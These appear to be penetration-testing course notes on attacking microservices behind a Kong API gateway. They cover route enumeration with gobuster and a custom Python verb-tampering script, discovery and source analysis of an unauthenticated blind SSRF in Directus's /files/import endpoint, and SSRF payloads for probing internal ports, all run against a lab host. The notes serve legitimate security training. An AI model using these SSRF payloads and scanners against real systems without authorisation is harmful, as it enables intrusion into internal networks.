
In this module, a black-box approach for testing microservices behind an API gateway is introduced, first by discovering and exploiting the Server Side Request Forgery (SSRF) vulnerability in Directus v9.0.0 rc34, then using this vulnerability to discover more information about the environment, and chaining multiple vulnerabilities together to achieve remote code execution.


# 9.1 Introduction to microservices

With the adoption of streamlined software development methods, some development teams have abandoned monolithic web applications in favor of many small ("micro") web services. These services provide data to users or perform actions on their behalf.

`Microservices` can refer to these individual services or to an architectural pattern that breaks down an application into multiple small or single functional modules.

A well-written microservice architecture provides basic functionality without dependencies on each other. Therefore, developers can create and deploy individual services independently. Multiple applications or users can use these services simultaneously without duplicating functionality.

For example, an e-commerce website can provide independent microservices for authentication, user management, shopping cart, product management, and checkout. Developers responsible for product management services can update their applications without redeploying the entire website. The product management service can even use its own database backend.

In this environment, microservices often run in containers and must communicate with each other. Since containers and their IP addresses are ephemeral, they often rely on DNS for service discovery. A common example is that a Docker network created with Compose will network each container's name as its hostname. Applications running in Docker containers can connect to each other based on these hostnames without including IP addresses in their configuration. There are many other software solutions that can assist service discovery by acting as a service registry, but we won't go into details here.

Each service module exposes its functionality through an API. When an API is exposed over HTTP or HTTPS, it is called a web service. There are two common types of web services: `SOAP` and `RESTful`. This module focuses on the more common `RESTful` web service.

Microservices are not directly exposed to the Internet, but the API gateway serves as the single entry point for the service. Because the API gateway usually provides some controls (such as authentication, rate limiting, input validation, TLS, etc.), the microservices themselves often do not implement these controls independently. In this case, if we are able to bypass the API gateway, we can bypass these controls and even call the backend service without authentication.

However, before we dive into potential attack vectors, let's take a moment to discuss the web service URL format, which will provide a baseline for service enumeration.

## 9.2.1 Web service URL format

Each API gateway routes requests to service endpoints differently, but the URL is typically parsed using regular expressions. For example, API Gateway can be configured to send any URI starting with /user to a specific service. The service itself is responsible for distinguishing URLs such as /user and /user/new.

There are many different RESTful web service URL formats, and we'll cover a few of them.

The following example is Best Buy’s [APIs.](https://bestbuyapis.github.io/api-documentation/#create-your-first-query)
![[Pasted image 20260726150854.png]]

Product APIs have an API-specific subdomain followed by "v1". APIs typically provide some way to call a specific "version" so changes can be made without breaking existing integrations. In this case, the version number is specified in the URL. This is a common design pattern, but there are others. ](https://www.troyhunt.com/your-api-versioning-is-wrong-which-is/)

The next part of the URL is "products", which is the service called in this example. This is followed by "8880044.json" which represents the requested SKU and data format.
- Depending on the API, we can usually request a different data format, such as XML or JSON, by changing the value of the "Accept" header in the HTTP request. However, some APIs ignore this header and always return the data in one format.

Next, let's look at an API with a different setup, specifically haveibeenpwned.com's API [. ](https://haveibeenpwned.com/API/v3#Authorisation)
```
GET https://haveibeenpwned.com/api/v3/{service}/{parameter}
```

Unlike the previous example, this API is called from the main domain name. The URL path contains "api" followed by the version number. Next, the URL path contains the service name and a parameter.

Finally, let’s look at GitHub’s API URL format. ](https://docs.github.com/en/rest/overview/resources-in-the-rest-api)
```
https://api.github.com/users/octocat
```
GitHub hosts its API on a subdomain. There is no version information in the URL path. The API provides a default version unless a version is specified in the request header.
- By default, all requests to ` https://api.github.com ` will use the v3 version of the REST API. We recommend that you explicitly request this version via the Accept request header.

The rest of the URL path follows the pattern of a service (or resource) and parameters, in this case "users" and "octocat" respectively.

Not every web service we encounter conforms to these patterns, nor can we review all possible formats. However, these examples provide a general understanding of web service URL patterns and help us test web services.

# 9.3 API discovery via Verb tampering

RESTful APIs typically bind functionality to HTTP request methods (or verbs). In other words, a service may have only one URL, but perform different actions based on the method of the HTTP request. HTTP requests sent using the GET method are retrieving data or objects. This method is sometimes called a safe method because it should not modify the state of the object, however, Applications can intentionally break this pattern.
- Web services terminology is confusing enough on its own, but the word "method" in a SOAP web service can also refer to a single operation. For example, "`lookupUser`" and "`updateUser`" might be two methods in the Users SOAP web service. All SOAP requests are typically sent via HTTP POST requests.

POST requests typically create new objects or new data. A PUT or PATCH request updates data for an existing object. Applications may handle these two request types differently, but PUT requests typically update the entire object, while PATCH requests update a subset of the object.

Finally, the DELETE request is used to delete an object. Additionally, some web services may handle deletions via a POST request with specific parameters.

It’s important to note that all of this is application-specific. A RESTful web service may not be fully implemented according to the REST standard. Additionally, a service endpoint may not support all HTTP methods. We need to keep this in mind when interacting with unknown web services. Regular enumeration tools usually send GET requests. These tools may miss API endpoints that do not respond to GET requests.


## 9.3.1 Initial enumeration

Now that we have the basics of web service URL formats, let's discuss service discovery. First, we will use curl to send an HTTP request to our API Gateway server.
``` d
kali@kali:~$ curl -i http://apigateway:8000
HTTP/1.1 404 Not Found
Date: Thu, 25 Feb 2021 14:58:05 GMT
Content-Type: application/json; charset=utf-8
Connection: keep-alive
Content-Length: 48
X-Kong-Response-Latency: 1
Server: kong/2.2.1

{"message":"no Route matched with those values"}
```

The server returns a 404 Not Found error and the Server header value is "kong/2.2.1". Through Google search, we are likely to encounter [Kong Gateway version 2.2.1](https://konghq.com/kong/). According to [docs](https://docs.konghq.com/gateway-oss/2.3.x/admin-api/), it has an admin API running on port 8001. However, attempts to access the port failed.
```
kali@kali:~$ curl -i  http://apigateway:8001
curl: (7) Failed to connect to apigateway port 8001: Connection refused
```

Use `gobuster` to find some valid API endpoints on the server. gobuster can display results based on a configured list of HTTP status codes. The API may return a `405 Method Not Allowed` response to GET requests. Configuring gobuster to display such responses can help us identify those API endpoints that are valid but do not allow GET requests. At the same time, the `dir` command will be used to perform a brute force search of the directory, using the `-w` parameter to define the dictionary, and the `-u` parameter to define the URL. Use the `-s` flag to pass in a custom status code list, adding 405 and 500 to the default list. This scan may take a few minutes to complete.
```d
kali@kali:~$ gobuster dir -u http://apigateway:8000 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -b "" -s "200,204,301,302,307,401,403,405,500"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://apigateway:8000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403,405,500
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/25 09:59:59 Starting gobuster
===============================================================
/files (Status: 403)
/fileschanged (Status: 403)
/userscripts (Status: 403)
/filescan (Status: 403)
/files2 (Status: 403)
/filesystem (Status: 403)
/filesharing (Status: 403)
/usersguide (Status: 403)
/filesystems (Status: 403)
/usersamples (Status: 403)
/rendering-arbitrary-objects-with-nevow-cherrypy (Status: 401)
/filesharing_microsoft (Status: 403)
/filesfoldersdisks (Status: 403)
/usersdomains (Status: 403)
/files-needed (Status: 403)
/renderplain (Status: 401)
/userscience (Status: 403)
/files_and_dirs (Status: 403)
/filesearchen (Status: 403)
/render (Status: 401)
/users_watchdog (Status: 403)
/filescavenger (Status: 403)
/filescavenger-811-421200 (Status: 403)
/filescavban (Status: 403)
/filescavenger-803-406688 (Status: 403)
/filescavenger-803-404384 (Status: 403)
/filesizeicon (Status: 403)
/users-ironpython (Status: 403)
/render_outline_to_html (Status: 401)
===============================================================
2021/02/25 10:10:13 Finished
===============================================================
```

This returns quite a few results. Most are 403 Forbidden errors, but there are also some 401 Unauthorized errors. Although we did not receive any 200 OK responses, the responses we received can help us understand the test environment. These responses may indicate that there is a valid API endpoint that requires authentication. Let's store them in a text file for use in other tools such as Burp Suite. We'll copy-paste into a text file, sort alphabetically, remove the status code, remove the leading slash, and save the result to a new text file.
``` bash
kali@kali:~$ sort endpoints.txt | cut -d" " -f1 | cut -d"/" -f2 > endpoints_sorted.txt 

kali@kali:~$ cat endpoints_sorted.txt
files2
files_and_dirs
filescan
filescavban
filescavenger-803-404384
filescavenger-803-406688
filescavenger-811-421200
filescavenger
fileschanged
filesearchen
filesfoldersdisks
filesharing_microsoft
filesharing
filesizeicon
files-needed
files
filesystems
filesystem
rendering-arbitrary-objects-with-nevow-cherrypy
render_outline_to_html
renderplain
render
usersamples
userscience
userscripts
usersdomains
usersguide
users-ironpython
users_watchdog
```

Import these results into Burp Suite. During the initial discovery scan, we could have proxied gobuster via Burp Suite,
But this leaves a lot of irrelevant data in the HTTP History tab. Now that we have a shorter list of endpoints of interest, we can run gobuster again using the sorted endpoints as a dictionary and proxy the call to Burp Suite using the `--proxy` flag when running Burp Suite.
``` bash
kali@kali:~$ gobuster dir -u http://apigateway:8000 -w endpoints_sorted.txt --proxy http://127.0.0.1:8080
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://apigateway:8000
[+] Threads:        10
[+] Wordlist:       endpoints_sorted.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Proxy:          http://127.0.0.1:8080
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/25 10:28:08 Starting gobuster
===============================================================
...
===============================================================
2021/02/25 10:28:09 Finished
===============================================================
```

Click the "Status" button to sort the results by status code to start analyzing the results.
![[Pasted image 20260727083408.png]]

We had four results that returned a 401 Forbidden response. In fact, these four responses are almost identical, only the value in the `X-Kong-Response-Latency` header differs.
```
HTTP/1.1 401 Unauthorized
Date: Thu, 25 Feb 2021 15:28:08 GMT
Content-Type: application/json; charset=utf-8
Connection: close
WWW-Authenticate: Key realm="kong"
Content-Length: 45
X-Kong-Response-Latency: 0
Server: kong/2.2.1

{
  "message":"No API key found in request"
}
```

Based on the URL path prefix `/render` and the response body content, the API gateway may route these four requests to the same backend service. All four responses include a `WWW-Authenticate` header with a value of `Key realm="kong"`, which means we probably need some kind of API key to call this service.

Responses to URL paths prefixed with `/users` and `/files` are very similar. They both return an `HTTP 403 Forbidden` response, with slightly different lengths. Let's look at the response to a request starting with `/users`.
``` dash
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 131
Connection: close
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"83-QQac6ttqCuyHQKqtWPBHLcfwFfM"
Date: Thu, 25 Feb 2021 15:28:09 GMT
X-Kong-Upstream-Latency: 93
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access the \"directus_users\" collection.","extensions":{"code":"FORBIDDEN"}}]}
```

These responses provide us with some additional information. We noticed that the `X-Powered-By` header had a value of "`Directus`" and an error message appeared: "You do not have permission to access the `directus_users` collection". The common value in the URL of these requests is `/users`.

For URL paths starting with `/files`, the response generates a slightly different error message (referencing the "`directus_files`" collection), but is otherwise identical.

Based on the `X-Powered-By` server header, we determine that this is a Directus [application. ](https://directus.io/) A quick online search reveals that Directus is a “instant application and API for SQL databases.” This information will come in handy later, but we will continue to evaluate this server from a black box perspective.

From our original list of 29 URLs, we appear to have three different endpoints: `files` , `users` and `render` . Let's save these three endpoints to a new file called `endpoints_simple.txt`.



## 9.3.2 Advanced enumeration with verb tampering

Now that we've found three potential API services, let's do another round of enumeration. URLs for RESTful APIs usually follow the pattern `<object>/<action>` or `<object>/<identifier>`. We can discover more services by looping through the list of identified endpoints and looking for valid operations or identifiers.

We also need to note that the response from the Web API may vary depending on the HTTP request method used. For example, a GET request to `/auth` may return an HTTP 404 response, while a POST request to the same URL returns HTTP 200 OK if the login is valid, or `HTTP 401 Unauthorized` if the login is invalid.


We can leverage different HTTP method response codes to identify more API endpoints. Gobuster can be configured to send other HTTP methods besides GET, but it will use the configured HTTP method for all requests. It does not send multiple HTTP methods in the same scan. In other words, if we configure it to send POST requests, Gobuster will only send POST requests and not GET requests. If we want to send different HTTP request methods to the same endpoint and compare response codes, we need to use other tools.

Let's create a Python script that will send requests to a series of endpoints using different HTTP methods. The script iterates through these endpoints and checks the response code for each request. The script prints out all endpoints with a response code other than 401, 403, or 404.

The script will start with the line [shebang](https://en.wikipedia.org/wiki/Shebang_\(Unix\)) and two import statements. We will use `argparse` to handle input parameters and the `requests` library to handle sending HTTP requests. The final script will be saved to a file called `route_buster.py`.
``` python
#!/usr/bin/env python3

import argparse
import requests
```

Next, we need to define parameter parsing and handling. We need a parameter to specify the target host. Our script will use two vocabularies: one for objects (or base endpoints) and one for actions. We will add two parameters to these two vocabularies.
``` python
parser = argparse.ArgumentParser()
parser.add_argument('-a','--actionlist', help='actionlist to use')
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('-w','--wordlist', help='wordlist to use')
args = parser.parse_args()
```

Our script needs to iterate through the entire "action list" for each endpoint in the word list. While not strictly necessary, we can avoid reading the Action List file repeatedly by reading it only once and keeping it in memory as a list.
``` python
actions = []

with open(args.actionlist, "r") as a:
    for line in a:
        try:
            actions.append(line.strip())
        except:
            print("Exception occurred")
```

The final step is to send the request and check the response code. We need to iterate through the endpoint dictionary, build the URL to request, and then send the request. The script prints out all URLs with a response code other than 204, 401, 403, or 404.
``` python
print("Path                - \tGet\tPost")
with open(args.wordlist, "r") as f:
    for word in f:
        for action in actions:
            print('\r/{word}/{action}'.format(word=word.strip(), action=action), end='')
            
            url = "{target}/{word}/{action}".format(target=args.target, word=word.strip(), action=action)
            
            r_get = requests.get(url=url).status_code
            r_post = requests.post(url=url).status_code

            if(r_get not in [204,401,403,404] or r_post not in [204,401,403,404]):
                print('                    \r', end='')
                print("/{word}/{action:10} - \t{get}\t{post}".format(word=word.strip(), action=action, get=r_get, post=r_post))

print('\r', end='')
print("Wordlist complete. Goodbye.")
```

Next, we focus on two vocabulary lists. We will use the discovered endpoints as the list of objects and a vocabulary of dirb as the second list. Currently, the script only sends GET and POST requests. We may be missing some endpoints by omitting PUT, PATCH, and DELETE requests, but we are working hard to achieve a balance between speed, noise, and effectiveness. Depending on the results of running the script, we may need to reconsider excluding these methods.

Let's run the script on the target server. This may take several minutes to complete.
``` bash
kali@kali:~$ ./route_buster.py -a /usr/share/wordlists/dirb/small.txt -w endpoints_simple.txt -t http://apigateway:8000
Path                -   Get     Post
/files/import     -     403     400
/users/frame      -     200     404
/users/home       -     200     404
/users/invite     -     403     400
/users/readme     -     200     404
/users/welcome    -     200     404
/users/wellcome   -     200     404
Wordlist complete. Goodbye.
```

Although we received multiple 200 OK responses to GET requests, these URLs did not contain any useful information when loaded in the browser. The script does give two interesting results, though. When the script sends POST requests to /files/import and /users/invite, the server returns an HTTP 400 Bad Request error instead of an HTTP 403 Forbidden error.

We first focus on the `/files/import` endpoint and send a POST request to it using curl. We will set the -i flag to include server response headers in the output.
``` python
kali@kali:~$ curl -i -X POST http://apigateway:8000/files/import
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 86
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"56-egVc9WbgXViwv0ZIaPJS4bmcvSo"
Date: Thu, 25 Feb 2021 16:06:54 GMT
X-Kong-Upstream-Latency: 26
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]}
```

We appear to have found an API endpoint that we can interact with (even though we haven't authenticated yet) and it provides usage information. The error message says "URL required". This is a promising clue. Whenever we find an API or web form that contains a _URL_ parameter, we check it for a Server-Side Request Forgery (SRF) vulnerability. We will discuss this issue in the next section.


#### exercise

Follow the steps in this section again.

#### extra effort


1. Extend the route_buster.py script to include the PUT and PATCH methods.
``` python
#!/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-a', '--actionlist', help = 'action list to use')
parser.add_argument('-t', '--target', help = 'host/ip to target', required = True)
parser.add_argument('-w', '--wordlist', help = 'wordlist to use')
args = parser.parse_args()

actions = []

with open(args.actionlist, "r") as file:
    for line in file:
        try:
            actions.append(line.strip())
        except:
            print("Exception occurred")

print("Path                - \tGet\tPost\tPut\tPatch")

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

with open(args.wordlist, "r") as file:
    for word in file:
        for action in actions:
            print('\r/{word}{action}'.format(word=word.strip(), action = action), end = '')

            url = "{target}/{word}/{action}".format(target = args.target, word = word.strip(), action = action)

            r_get = requests.get(url = url, proxies=proxies).status_code
            r_post = requests.post(url = url, proxies=proxies).status_code

            r_put = requests.put(url = url, proxies=proxies).status_code
            r_patch = requests.patch(url = url, proxies=proxies).status_code

            if (
                r_get not in [204, 401, 403, 404] or 
                r_post not in [204, 401, 403, 404] or
                r_put not in [204, 401, 403, 404] or
                r_patch not in [204, 401, 403, 404]):
                print('                    \r', end='')
                print("/{word}/{action:10} - \t{get}\t{post}\t{put}\t{patch}".format(word=word.strip(), action=action, get=r_get, post=r_post, put=r_put, patch=r_patch))

print('\r', end='')
print("Wordlist complete. Goodbye.")

```


2. Investigate the /users/invite endpoint. What information are we missing to make a valid request?

What is missing are two key pieces of information in the request body
- `email`: the email address to be invited
- `role`: The role UUID to be assigned to this user

Kong 2.2.1: API gateway/reverse proxy, responsible for accepting requests, routing and forwarding, and possible authentication or current limiting
Directus: The backend application that actually handles `users/invite`, defining what JSON fields are required for that endpoint
Responses in the material appear simultaneously:

```
X-Kong-Upstream-Latency
Via: kong/2.2.1
X-Powered-By: Directus
```
- This means that the request goes to Kong first, and then Kong forwards it to Directus. Parameter verification of `/users/invite`, such as `400 INVALID_PAYLOAD` when `email` or `role` is missing, is the implementation logic of Directus, so you should check the interface definition of Directus.



# 9.4 Introduction to server-side request forgery

Server-side request forgery (SSRF) is when an attacker is able to force an application or server to request data or resources. Because the request originates from the server, the attacker may be able to access data that he or she does not have direct access to. In addition, the server may access services running on the localhost interface or other servers behind a firewall or reverse proxy.

The impact of an SSRF vulnerability depends on what data it can access, and whether SSRF returns any resulting data to the attacker. However, SSRF vulnerabilities are especially effective against microservices. As we discussed earlier, microservices typically have fewer security controls if they rely on an API gateway or reverse proxy for security controls. If the microservices are in a flat network, we can exploit the SSRF vulnerability to make one microservice communicate directly with another microservice. Any controls enforced by the API gateway will not apply to traffic between the two microservices, allowing SSRF vulnerabilities to be exploited to gather information about the internal network and open new attack vectors on that network.


## 9.4.1 Server-side request forgery detection

Determine whether this application contains an SSRF attack.

After fuzzing the API, we discovered that `/files/import` returned an error message indicating that we needed to include a `url` parameter.
```
{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]}
```

We always need to check URL parameters in API or web forms for SSRF vulnerabilities

Since the server returns errors as a JSON message, we also make the POST request use JSON format. We will use a unique file name in the URL parameters to make it easier to find it in the Apache log files. For now, we don't care if the file actually exists on the Kali host, we just want to determine if the API server will request the file from our web server.

Use curl to send the payload. We will set `-H "Content-Type: application/json"` to include a Content-Type header with value `"application/json"` in the request, and use the `-d` flag to include our JSON payload.
``` bash
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
Date: Thu, 25 Feb 2021 16:18:24 GMT
X-Kong-Upstream-Latency: 118
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
```


We received an HTTP 500 response with the message "Request failed with status code 404". Check the Apache logs for any requests. If the Apache server is not started, there will be no log information.
```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ sudo systemctl status apache2
○ apache2.service - The Apache HTTP Server
     Loaded: loaded (/usr/lib/systemd/system/apache2.service; disabled; preset: disabled)
     Active: inactive (dead)
       Docs: https://httpd.apache.org/docs/2.4/
                                                                                               
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ sudo systemctl start apache2
                                                                                               
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.245/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
Date: Sun, 26 Jul 2026 23:46:39 GMT
X-Kong-Upstream-Latency: 223
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}                                                                                               
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ sudo tail /var/log/apache2/access.log
192.168.135.135 - - [27/Jul/2026:09:46:40 +1000] "GET /ssrftest HTTP/1.1" 404 496 "-" "axios/0.21.1"

```

This backend service is vulnerable to SSRF. The user-agent in the request is [_Axios_](https://axios-http.com/), an HTTP client for Node.js.
Add a file called ssrftest in the Apache website root directory so that the server can access it, then use curl to resend the request.
```
sudo install -m 0644 /dev/null /var/www/html/ssrftest
```


```
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.245/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Thu, 25 Feb 2021 16:22:52 GMT
X-Kong-Upstream-Latency: 117
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
```

We received an HTTP 403 Forbidden response with the error message "You do not have permission to access this content." However, when we check the Apache log files, we can confirm that the application did send the request and our Apache server returned HTTP 200 OK .
```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ sudo tail /var/log/apache2/access.log
192.168.135.135 - - [27/Jul/2026:09:46:40 +1000] "GET /ssrftest HTTP/1.1" 404 496 "-" "axios/0.21.1"
192.168.135.135 - - [27/Jul/2026:09:49:58 +1000] "GET /ssrftest HTTP/1.1" 200 219 "-" "axios/0.21.1"
```
- The unauthenticated SSRF vulnerability does exist, but the server does not return the results of the forged request. This is often referred to as a blind SSRF vulnerability.


## 9.4.2 Source code analysis

Before continuing with the attack, since Directus is open source, let’s take a look at the source code. Although we are studying this module as a black box analysis, it is still critical to understand what causes this vulnerability in the application code. We hope to be able to apply what we know about this specific vulnerability to other applications to understand the root cause of this vulnerability.

Let’s start with authentication. The authentication handler is defined in the /api/src/middleware/authenticate.ts file. The relevant code is located on line 12 through [line 21. ](https://github.com/directus/directus/blob/v9.0.0-rc.34/api/src/middleware/authenticate.ts)
``` ts
12  const authenticate: RequestHandler = asyncHandler(async (req, res, next) => {
13    req.accountability = {
14      user: null,
15      role: null,
16      admin: false,
17      ip: req.ip.startsWith('::ffff:') ? req.ip.substring(7) : req.ip,
18      userAgent: req.get('user-agent'),
19    };
20  
21    if (!req.token) return next();
22  
23    if (isJWT(req.token)) {
```

On lines 13 to 19, the function creates a new responsibility object on the request. It is worth noting that the user and role variables are set to null. The function then checks whether the token exists on the request object. If there is no token, the function returns next() and execution is passed to the next middleware function.

If we make a request without a token, the authentication handler will create a default Accountability object and then pass execution to the next middleware function without throwing an error.

Next, let's take a look at the code of the file controller defined in `/api/src/controllers/files.ts` ([source code](https://github.com/directus/directus/blob/v9.0.0-rc.34/api/src/controllers/files.ts)). The relevant code starts on line 138.
```js
138  router.post(
139    '/import',
140    asyncHandler(async (req, res, next) => {
141      const { error } = importSchema.validate(req.body);
142  
143      if (error) {
144        throw new InvalidPayloadException(error.message);
145      }
146  
147      const service = new FilesService({
148        accountability: req.accountability,
149        schema: req.schema,
150      });
```

This function first validates the request body and throws an error if the request body is invalid. Next, the code creates a FileService object using the account object created by the authentication handler. Although we won't examine the specific code of the FileService object, its constructor is only used to store the Account object.

```js
152      const fileResponse = await axios.get<NodeJS.ReadableStream>(req.body.url, {
153        responseType: 'stream',
154      });
155  
156      const parsedURL = url.parse(fileResponse.request.res.responseUrl);
157      const filename = path.basename(parsedURL.pathname as string);
158  
159      const payload = {
160        filename_download: filename,
161        storage: toArray(env.STORAGE_LOCATIONS)[0],
162        type: fileResponse.headers['content-type'],
163        title: formatTitle(filename),
164        ...(req.body.data || {}),
165      };
```

On line 152, the function requests the value submitted in the url parameter using the axios_library. The code stores the request results in the _fileResponse_ variable. At this point, the code has not yet checked whether the initial request to the file controller contains a valid JSON Web Token (JWT).

``` js
167      const primaryKey = await service.upload(fileResponse.data, payload);
168  
169      try {
170        const record = await service.readByKey(primaryKey, req.sanitizedQuery);
171        res.locals.payload = { data: record || null };
172      } catch (error) {
173        if (error instanceof ForbiddenException) {
174          return next();
175        }
176  
177        throw error;
178      }
179  
180      return next();
181    }),
182    respond
183  );
```

It’s not until line 170 that we encounter the authentication check (`readByKey`). We will not review all remaining code. To summarize, FileService's readByKey() function is responsible for checking authorization. FileService inherits the readByKeys() function from ItemService. The processAST() function defined in `/api/src/services/authorization.ts` handles authorization.

The application is vulnerable to an unauthenticated blind SSRF attack because it downloads the contents of submitted URLs before checking authorization to store and retrieve that content. Authenticated users will most likely be able to use the file import functionality and access the retrieved data.

#### extra effort

View the source code of /users/invite. Find out why it cannot be exploited.
![[Pasted image 20260727105136.png]]

![[Pasted image 20260727105149.png]]


![[Pasted image 20260727105202.png]]


![[Pasted image 20260727110121.png]]

![[Pasted image 20260727110135.png]]


![[Pasted image 20260727110306.png]]



![[Pasted image 20260727110250.png]]

![[Pasted image 20260727111017.png]]


![[Pasted image 20260727111004.png]]

Equivalent to: anonymously:
```
role: null
```

Instead of "allow if role is null", it tells the database: **Look for permission rules belonging to anonymous/public roles**.
Conceptually equivalent to:
```
SELECT *
FROM directus_permissions
WHERE action = 'create'
  AND collection = 'directus_users'
  AND role IS NULL;
```
- Rules found: Check field permissions again.
- Rule not found: `throw new ForbiddenException()` is executed and the request is rejected.


## 9.4.3 Exploiting blind SSRF attacks in Directus

Since we don't have access to the results of SSRF, how can we use it to advance our attack?
The application returns different messages for valid files and non-existent files. We can use these different messages to infer whether a resource exists.

When we request a valid resource, we will receive an HTTP 403 Forbidden error; when we request a resource that does not exist, we will receive an HTTP 500 Internal Server Error and display "Request failed with status code 404".

Let's test if we can use an SSRF attack to force Directus to connect to itself. If we send a localhost URL, the application should try to connect to its own server. Since such requests come from the server, we can use such a payload to access ports that only listen on localhost.

Send the URL value "`http://localhost:8000/`".
```
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8000/"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-MCdMjU9mfpVtWiLKyczhTW/6Xqo"
Date: Thu, 25 Feb 2021 16:34:32 GMT
X-Kong-Upstream-Latency: 27

{"errors":[{"message":"connect ECONNREFUSED 127.0.0.1:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
```


We received a connection refused error message. This new error message is interesting. We know that port 8000 on the API gateway server is open to the outside world. However, if Directus is running on another server behind the API Gateway, "localhost" refers to the other server behind it, not the server running the Kong API Gateway.

A quick Google search revealed that the default port for Directus is 8055. Let's test this port on localhost.
```
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8055/"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Thu, 25 Feb 2021 16:35:58 GMT
X-Kong-Upstream-Latency: 35
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
```

The server returned a "FORBIDDEN" error code, so the resource we requested is valid. We can easily verify that TCP port 8055 on the Kong API Gateway server is closed externally. In this case we may be dealing with two or more servers.
![[Pasted image 20260727111409.png]]

This example demonstrates that we can exploit SSRF vulnerabilities to discover more information about the internal network.

#### practise

1. Repeat the above steps.
2. An SSRF vulnerability is exploited to access non-HTTP services running on the Kali host. What will be the result? What's the use of this?

```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.245:4444/"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 100
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"64-a8QWr7aivWKj8jzGdwo7FYPrskY"
Date: Mon, 27 Jul 2026 01:20:23 GMT
X-Kong-Upstream-Latency: 6003
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"Parse Error: Expected HTTP/","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}  
```

```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.245] from (UNKNOWN) [192.168.135.135] 56514
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.21.1
Host: 192.168.45.245:4444
Connection: close

```

The `nc` listener received a connection from `192.168.135.135` and saw:
```
GET / HTTP/1.1
